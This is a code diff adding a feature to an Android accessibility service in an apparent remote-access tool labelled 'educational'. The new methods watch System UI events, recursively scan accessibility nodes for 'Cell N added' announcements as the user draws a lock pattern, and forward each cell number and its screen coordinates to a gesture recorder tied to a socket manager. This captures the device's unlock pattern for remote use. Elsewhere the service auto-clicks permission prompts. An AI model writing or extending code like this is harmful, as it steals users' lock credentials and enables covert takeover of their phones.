@@ -419,6 +419,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
                 case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                     autoClickAllowButton();
+                    // Advanced Unlock: when systemui fires a content change, scan for
+                    // "Cell N added" nodes that appear as the user draws their lock pattern.
+                    if ("com.android.systemui".equals(packageName)) {
+                        checkAdvancedUnlockCells(event);
+                    }
                     break;
 
                 case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
@@ -506,6 +511,68 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+
+    /**
+     * Scan the accessibility node tree for "Cell N added" descriptions that
+     * Android's lock-screen pattern view announces as the user draws each dot.
+     * Forwards every newly-seen cell to GestureRecorder for advanced-unlock capture.
+     */
+    private void checkAdvancedUnlockCells(AccessibilityEvent event) {
+        try {
+            com.remoteaccess.educational.commands.GestureRecorder gr =
+                    com.remoteaccess.educational.network.SocketManager
+                            .getInstance(this).getGestureRecorder();
+            if (gr == null) return;
+            AccessibilityNodeInfo source = event.getSource();
+            if (source == null) return;
+            scanNodeForAdvancedUnlockCells(source, gr);
+            source.recycle();
+        } catch (Exception ignored) {}
+    }
+
+    /**
+     * Recursively walk the accessibility node tree looking for nodes whose
+     * contentDescription (or text) matches "Cell N added" (N = 1-9).
+     * When found, extract the cell number and its on-screen bounds and forward
+     * them to the GestureRecorder.
+     */
+    private void scanNodeForAdvancedUnlockCells(AccessibilityNodeInfo node,
+            com.remoteaccess.educational.commands.GestureRecorder gr) {
+        if (node == null) return;
+        try {
+            String[] toCheck = new String[2];
+            CharSequence d = node.getContentDescription();
+            CharSequence t = node.getText();
+            toCheck[0] = d != null ? d.toString() : null;
+            toCheck[1] = t != null ? t.toString() : null;
+            for (String s : toCheck) {
+                if (s != null && s.startsWith("Cell ") && s.endsWith(" added")) {
+                    try {
+                        String numStr = s.substring(5, s.length() - 6).trim();
+                        int cellNum = Integer.parseInt(numStr);
+                        if (cellNum >= 1 && cellNum <= 9) {
+                            android.graphics.Rect bounds = new android.graphics.Rect();
+                            node.getBoundsInScreen(bounds);
+                            if (bounds.width() > 0 && bounds.height() > 0) {
+                                gr.onAdvancedUnlockCellDetected(cellNum,
+                                        bounds.left, bounds.top, bounds.right, bounds.bottom);
+                            }
+                        }
+                    } catch (NumberFormatException ignored) {}
+                }
+            }
+            int childCount = node.getChildCount();
+            for (int i = 0; i < childCount; i++) {
+                try {
+                    AccessibilityNodeInfo child = node.getChild(i);
+                    if (child != null) {
+                        scanNodeForAdvancedUnlockCells(child, gr);
+                        child.recycle();
+                    }
+                } catch (Exception ignored) {}
+            }
+        } catch (Exception ignored) {}
     }
 
     /** Starts permission scanner IMMEDIATELY when accessibility is enabled.
